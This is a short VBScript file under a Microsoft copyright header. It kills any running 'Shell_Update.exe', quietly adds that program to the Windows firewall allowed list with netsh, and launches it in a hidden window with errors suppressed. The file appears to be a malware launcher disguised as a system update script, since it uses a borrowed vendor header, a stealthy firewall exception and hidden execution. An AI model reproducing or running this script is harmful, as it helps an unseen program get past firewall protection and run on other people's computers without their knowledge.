 'Copyright (c) Microsoft Corporation. All rights reserved.
 
on error resume next
Dim objWMIService, objProcess, colProcess
Dim strComputer, strProcessKill
Set Shell = WScript.CreateObject("WScript.Shell")
strComputer = "."
strProcessKill = "'Shell_Update.exe'"

Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process Where Name = " & strProcessKill )

  For Each objProcess in colProcess
    objProcess.Terminate()
  Next
  
Shell.Run "netsh firewall add allowedprogram program=Shell_Update.exe name=Win32_ShellUpdate",0, true 
Shell.Run "Shell_Update.exe",0, true 

Set WSHShell = Nothing
WScript.Quit(0)
